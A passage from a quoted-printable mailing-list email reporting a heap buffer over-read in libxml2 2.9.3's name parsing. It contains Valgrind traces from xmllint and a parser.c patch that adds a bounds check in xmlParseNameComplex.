> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E944FF: xmlReadFile (in /usr/lib/x86_64-linux=
-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x111EA3: ??? (in /usr/bin/xmllint)
> =3D=3D146420=3D=3D    by 0x10EDFE: ??? (in /usr/bin/xmllint)
> =3D=3D146420=3D=3D    by 0x521582F: (below main) (libc-start.c:291)
> =3D=3D146420=3D=3D  Address 0x830d378 is 0 bytes after a block of size 10=
4 alloc'd
> =3D=3D146420=3D=3D    at 0x4C2DB8F: malloc (in /usr/lib/valgrind/vgpreloa=
d_
> memcheck-amd64-linux.so)
> =3D=3D146420=3D=3D    by 0x4E735E1: xmlNewInputStream (in
> /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E75FA3: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E8871F: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E88954: xmlParseMarkupDecl (in
> /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E89214: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E8DB4E: xmlParseDocument (in /usr/lib/x86_64-=
linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E944FF: xmlReadFile (in /usr/lib/x86_64-linux=
-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x111EA3: ??? (in /usr/bin/xmllint)
> =3D=3D146420=3D=3D    by 0x10EDFE: ??? (in /usr/bin/xmllint)
> =3D=3D146420=3D=3D    by 0x521582F: (below main) (libc-start.c:291)
> =3D=3D146420=3D=3D
> =3D=3D146420=3D=3D
> =3D=3D146420=3D=3D 162 errors in context 2 of 2:
> =3D=3D146420=3D=3D Invalid read of size 1
> =3D=3D146420=3D=3D    at 0x4C32766: memcpy@@GLIBC_2.14 (in
> /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
> =3D=3D146420=3D=3D    by 0x4F74FBD: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4F75C3C: xmlDictLookup (in /usr/lib/x86_64-lin=
ux-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E7C523: xmlParseName (in /usr/lib/x86_64-linu=
x-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E83B1F: xmlParseElementDecl (in
> /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E889F4: xmlParseMarkupDecl (in
> /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E89214: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E8DB4E: xmlParseDocument (in /usr/lib/x86_64-=
linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E944FF: xmlReadFile (in /usr/lib/x86_64-linux=
-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x111EA3: ??? (in /usr/bin/xmllint)
> =3D=3D146420=3D=3D    by 0x10EDFE: ??? (in /usr/bin/xmllint)
> =3D=3D146420=3D=3D    by 0x521582F: (below main) (libc-start.c:291)
> =3D=3D146420=3D=3D  Address 0x830d379 is 1 bytes after a block of size 10=
4 alloc'd
> =3D=3D146420=3D=3D    at 0x4C2DB8F: malloc (in /usr/lib/valgrind/vgpreloa=
d_
> memcheck-amd64-linux.so)
> =3D=3D146420=3D=3D    by 0x4E735E1: xmlNewInputStream (in
> /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E75FA3: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E8871F: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E88954: xmlParseMarkupDecl (in
> /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E89214: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E8DB4E: xmlParseDocument (in /usr/lib/x86_64-=
linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E944FF: xmlReadFile (in /usr/lib/x86_64-linux=
-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x111EA3: ??? (in /usr/bin/xmllint)
> =3D=3D146420=3D=3D    by 0x10EDFE: ??? (in /usr/bin/xmllint)
> =3D=3D146420=3D=3D    by 0x521582F: (below main) (libc-start.c:291)
> =3D=3D146420=3D=3D
> =3D=3D146420=3D=3D ERROR SUMMARY: 216 errors from 2 contexts (suppressed:=
 0 from 0)
>
> PATCHED BY:
> --- a/parser.c
> +++ a/parser.c
> @@ -3312,6 +3312,7 @@ xmlParseNameComplex(xmlParserCtxtPtr ctxt) {
>      int len =3D 0, l;
>      int c;
>      int count =3D 0;
> +    size_t startPosition =3D 0;
>
>  #ifdef DEBUG
>      nbParseNameComplex++;
> @@ -3323,6 +3324,7 @@ xmlParseNameComplex(xmlParserCtxtPtr ctxt) {
>      GROW;
>      if (ctxt->instate =3D=3D XML_PARSER_EOF)
>          return(NULL);
> +    startPosition =3D CUR_PTR - BASE_PTR;
>      c =3D CUR_CHAR(l);
>      if ((ctxt->options & XML_PARSE_OLD10) =3D=3D 0) {
>          /*
> @@ -3420,9 +3422,11 @@ xmlParseNameComplex(xmlParserCtxtPtr ctxt) {
>          xmlFatalErr(ctxt, XML_ERR_NAME_TOO_LONG, "Name");
>          return(NULL);
>      }
> -    if ((*ctxt->input->cur =3D=3D '\n') && (ctxt->input->cur[-1] =3D=3D =
'\r'))
> -        return(xmlDictLookup(ctxt->dict, ctxt->input->cur - (len + 1),
> len));
> -    return(xmlDictLookup(ctxt->dict, ctxt->input->cur - len, len));
> +
> +    if (BASE_PTR + startPosition + len > ctxt->input->end)
> +      return(NULL);
> +
> +    return(xmlDictLookup(ctxt->dict, BASE_PTR + startPosition, len));
>  }
>
>  /**
> Best regards,
> - Marcel
>
> ---
> Marcel Boehme
> Postdoctoral Research Fellow
> TSUNAMi Security Research Centre
> National University of Singapore

--001a114178c24e21c90550144a11--
